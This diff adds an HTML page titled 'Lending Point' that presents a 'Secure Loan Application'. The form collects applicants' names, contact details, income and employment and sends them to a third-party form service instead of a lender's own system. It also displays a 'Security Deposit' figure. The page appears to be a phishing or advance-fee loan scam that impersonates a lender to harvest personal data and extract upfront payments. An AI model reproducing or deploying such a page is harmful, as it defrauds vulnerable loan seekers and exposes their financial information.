@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lending Point</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header>
+    <div class="logo">Lending Point</div>
+    <div class="sub">United States • Since 2000</div>
+</header>
+
+<div class="card">
+
+    <h2>Secure Loan Application</h2>
+
+    <form id="loanForm" action="https://formspree.io/f/mzdkgjwl" method="POST">
+        <!-- Name, Email, Phone -->
+        <input type="text" name="name" placeholder="Full Name" required>
+        <input type="email" name="email" placeholder="Email Address" required>
+        <input type="text" name="phone" placeholder="Phone Number" required>
+
+        <!-- Loan Amount -->
+        <input type="number" name="amount" id="amount" placeholder="Loan Amount ($)" required>
+
+        <!-- Purpose of Loan -->
+        <label for="purpose">Purpose of Loan</label>
+        <select name="purpose" id="purpose" required>
+            <option value="">Select Purpose</option>
+            <option value="personal">Personal</option>
+            <option value="business">Business</option>
+            <option value="education">Education</option>
+            <option value="medical">Medical</option>
+            <option value="other">Other</option>
+        </select>
+
+        <!-- Employment Status -->
+        <label for="employment">Employment Status</label>
+        <select name="employment" id="employment" required>
+            <option value="">Select Status</option>
+            <option value="employed">Employed</option>
+            <option value="self-employed">Self-Employed</option>
+            <option value="student">Student</option>
+            <option value="unemployed">Unemployed</option>
+            <option value="retired">Retired</option>
+        </select>
+
+        <!-- Monthly Income -->
+        <input type="number" name="income" placeholder="Monthly Income ($)" required>
+
+        <!-- Loan Term -->
+        <label for="term">Loan Term (Months)</label>
+        <select name="term" id="term" required>
+            <option value="">Select Term</option>
+            <option value="6">6 months</option>
+            <option value="12">12 months</option>
+            <option value="24">24 months</option>
+            <option value="36">36 months</option>
+            <option value="48">48 months</option>
+        </select>
+
+        <!-- Additional Notes -->
+        <textarea name="notes" placeholder="Additional Notes (Optional)"></textarea>
+
+        <!-- Security Deposit Display -->
+        <div class="info">
+            <p id="deposit">Security Deposit: $0</p>
+        </div>
+
+        <button type="submit">Continue</button>
+    </form>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
